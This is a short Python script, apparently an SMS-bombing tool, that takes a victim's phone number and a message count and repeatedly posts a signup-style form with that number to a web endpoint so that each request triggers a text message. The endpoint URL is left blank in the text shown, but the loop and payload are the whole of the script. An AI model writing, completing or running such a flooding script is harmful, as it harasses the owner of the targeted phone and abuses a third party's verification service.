#!/usr/bin/python3
import requests
num=input("enter number:")
rg=int(input("enter sms quantity:"))
values = range(rg)
for i in values:
	h=''
	payload={'first_name':'a','phone_varify':'0','last_name':'a','user_id':'','work_phone':num}
	r=requests.post(h,data=payload,timeout=10)
	print(r.json())
